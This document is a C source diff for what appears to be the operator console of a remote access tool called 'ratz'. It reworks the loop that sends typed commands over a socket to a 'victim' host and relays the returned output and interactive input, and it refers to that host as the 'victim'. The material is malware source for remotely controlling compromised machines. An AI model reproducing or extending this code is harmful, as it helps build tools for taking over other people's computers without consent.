@@ -63,6 +63,7 @@ void	exit_interpret(s_red* red)
 	red->killed = 1;
 }
 
+#include <poll.h>
 int	main(int unused, char** av)
 {
 	(void)unused;
@@ -80,6 +81,12 @@ int	main(int unused, char** av)
 	fcntl(red.ratz.server, F_SETFL, ~O_NONBLOCK);
 	recv_auth_error(red);
 	fcntl(red.ratz.server, F_SETFL, fcntl(red.ratz.server, F_GETFL) | O_NONBLOCK);
+
+	//struct pollfd pfd;
+	//pfd.fd = red.ratz.server;
+	//pfd.events = POLLIN;
+	//pfd.revents = 0;
+
 	while (red.killed == 0)
 	{
 		red.buffer = readline(RATZ_PROMPT);
@@ -94,9 +101,43 @@ int	main(int unused, char** av)
 				if (write(red.ratz.server, red.buffer, strlen(red.buffer)) <= 0)
 					strexit("victim disconnected", 0);
 				fcntl(red.ratz.server, F_SETFL, fcntl(red.ratz.server, F_GETFL) & ~O_NONBLOCK);
-				n = read(red.ratz.server, output, sizeof(output));
-				fcntl(red.ratz.server, F_SETFL, fcntl(red.ratz.server, F_GETFL) | O_NONBLOCK);
-				write(STDOUT_FILENO, output, n);
+				fcntl(STDIN_FILENO, F_SETFL, O_NONBLOCK);
+				memset(output, 0, sizeof(output));
+				while (1)
+				{
+					sleep(1);
+					//poll(&pfd, 1, 100);
+					//printf("q\n");
+					fcntl(red.ratz.server, F_SETFL, O_NONBLOCK);
+					n = read(red.ratz.server, output, sizeof(output));
+					if (n > 0)
+					{
+						if (strstr(output, "\0033EONING\003"))
+						{
+							if (n > 10) // strlen("\0033EONING\003")
+								write(STDOUT_FILENO, output, n - 10); // strlen("\0033EONING\003")
+							write(STDOUT_FILENO, "EONING\n", 8);
+							break;
+						}
+						else
+							write(STDOUT_FILENO, output, n);
+					}
+					//poll(&pfd, 1, 0);
+					n = 0;
+					//if (pfd.revents & POLLIN)
+					//{
+					//	printf("stdin\n");
+					//	while ((n = read(STDIN_FILENO, output, DEBUG_SIZE_MAX)) <= 0)	// readall jusqu'a '\n' ou '\003' (eof)
+					//		;
+					//}
+					n = read(STDIN_FILENO, output, DEBUG_SIZE_MAX);
+					//printf("n : %d\n", n);
+					fcntl(red.ratz.server, F_SETFL, ~O_NONBLOCK);
+					if (n > 0)
+						write(red.ratz.server, output, n - 1);
+				}
+				printf("sortie\n");
+				fcntl(red.ratz.server, F_SETFL, fcntl(red.ratz.server, F_GETFL) & ~O_NONBLOCK);
 				free(red.buffer);
 			}
 		}
